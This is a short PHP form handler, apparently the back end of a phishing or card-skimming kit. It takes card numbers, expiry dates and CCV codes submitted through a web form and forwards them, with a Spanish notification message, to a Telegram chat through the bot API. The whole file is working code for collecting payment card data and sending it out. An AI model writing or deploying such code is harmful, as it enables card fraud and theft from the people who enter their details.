<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
$botToken = getenv('BOT_TOKEN');
$chatId = getenv('CHAT_ID');
if (!$botToken || !$chatId) {
    http_response_code(500);
    echo json_encode(['ok'=>false,'error'=>'Missing BOT_TOKEN or CHAT_ID']);
    exit;
}
$fields = array();
$fields['cardNumber'] = isset($_POST['cardNumber']) ? trim((string)$_POST['cardNumber']) : '';
$fields['expiryDate'] = isset($_POST['expiryDate']) ? trim((string)$_POST['expiryDate']) : '';
$fields['ccv'] = isset($_POST['ccv']) ? trim((string)$_POST['ccv']) : '';

$msg = "🔔 Nuevo formulario enviado (modo servidor)\n\n";
foreach ($fields as $k => $v) {
    $msg .= "*{$k}*: " . ($v === '' ? "(vacío)" : $v) . "\n";
}
$msg .= "\n🕓 Fecha: " . date('Y-m-d H:i:s');

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$data = http_build_query(array('chat_id'=>$chatId,'text'=>$msg,'parse_mode'=>'Markdown'));
$options = array('http'=>array('header'=>"Content-Type: application/x-www-form-urlencoded\r\n",'method'=>'POST','content'=>$data,'timeout'=>10));
$context = stream_context_create($options);
$res = @file_get_contents($url, false, $context);
if ($res === FALSE) {
    http_response_code(500);
    echo json_encode(array('ok'=>false,'error'=>'send_failed'));
} else {
    echo json_encode(array('ok'=>true));
}
?>
